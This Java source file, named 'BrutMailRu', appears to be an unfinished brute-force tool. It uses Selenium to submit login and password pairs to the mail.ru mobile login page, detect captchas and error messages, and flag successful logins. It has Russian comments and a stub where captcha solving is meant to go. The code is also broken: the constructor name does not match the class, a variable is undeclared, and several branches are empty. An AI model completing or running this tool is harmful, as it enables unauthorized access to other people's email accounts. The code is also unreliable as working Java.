import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

public class BrutMailRu {

    private final String HTML_INPUT_NAME_LOGIN = "Login";
    private final String HTML_INPUT_NAME_PASSWORD = "Password";
    private final String CSS_CLASS_NAME_CAPTCHA = "js-captcha";
    private final String CSS_CLASS_NAME_ERROR_MSG = "error";
    private final String AUTH_PAGE_URL = "https://m.mail.ru/login";

    private final int TIME_WAIT_INPUT = 10;
    private final int TIME_WAIT_CAPTCHA_IMG = 10;


    WebDriver webDriver;

    public Auth(WebDriver webDriver) {
        this.webDriver = webDriver;
    }

    public void sendForm(String login, String pass, String recognizedCaptcha, WebElement objCaptcha) {
        WebElement loginInput = (new WebDriverWait(this.webDriver, TIME_WAIT_INPUT))
                .until(ExpectedConditions.presenceOfElementLocated(By.name(HTML_INPUT_NAME_LOGIN)));
        WebElement passInput = (new WebDriverWait(this.webDriver, TIME_WAIT_INPUT))
                .until(ExpectedConditions.presenceOfElementLocated(By.name(HTML_INPUT_NAME_PASSWORD)));
        //заполняем логин и пасс
        loginInput.sendKeys(login);
        passInput.sendKeys(pass);
        if (objCaptcha != null && recognizedCaptcha != null) {
            objCaptcha.sendKeys(recognizedCaptcha);
        }
        //сендим форму
        loginInput.submit();
        System.out.println("#Попытка авторизации, логин: " + login + " пароль: " + pass);
    }

    public boolean checkCapcha() { // чекаем наличие капчи в error месседже
        try {
            WebElement captcha = (new WebDriverWait(this.webDriver, TIME_WAIT_CAPTCHA_IMG))
                    .until(ExpectedConditions.presenceOfElementLocated(By.className(CSS_CLASS_NAME_CAPTCHA)));
            System.out.println("Капча детектед");
            //ВЫЗЫВАЕМ МЕТОД РАЗГАДКИ КАПЧИ
            return true;
        } catch (org.openqa.selenium.TimeoutException e) {
            System.out.println("Капча не найдена");
            return false;
        }
    }

    public boolean login(String login, String pass) throws org.openqa.selenium.TimeoutException { //попытка авторизации

        if (!checkErrorMsg(this.webDriver)) { //если сообщения об ошибке нет
            sendForm(login, pass, null, null);
        } else {
            if (checkCapcha()) {

            }
        }


        try {
            //ждем формы

            return true;
        } catch (org.openqa.selenium.TimeoutException e) { //если не нашли все формы
            System.out.println("Не нашли формы для заполнения");
            return false;
        }
    }

    public boolean checkErrorMsg(WebDriver driver) { // чекаем сообщение об ошибке авторизации. Нашли - true, не найдено - false.
        try {
            WebElement errorMsg = (new WebDriverWait(driver, 10))
                    .until(ExpectedConditions.presenceOfElementLocated(By.className(CSS_CLASS_NAME_ERROR_MSG)));
            return true;
        } catch (org.openqa.selenium.TimeoutException e) {
            System.out.println("Сообщение об ошибке авторизации отсутствует.");
            return false;
        }
    }


    public static boolean checkLogin(WebDriver driver) { // проверяем на предмет успешной авторизации по элементу с id "PH_user-email"
        try {
            err = (new WebDriverWait(driver, 10))
                    .until(ExpectedConditions.presenceOfElementLocated(By.id("PH_user-email")));
            System.out.println(">Залогинились< пароль:^");
            return true;
        } catch (org.openqa.selenium.TimeoutException e) { // если признак успешной авторизации не найден
            System.out.println("Авторизация неуспешна. Наверно что-то с инетом или чет странное, смотри браузер, а да, чуть не забыл, вот тебе стектрейс:" + e);
            return false;
        }
    }
}
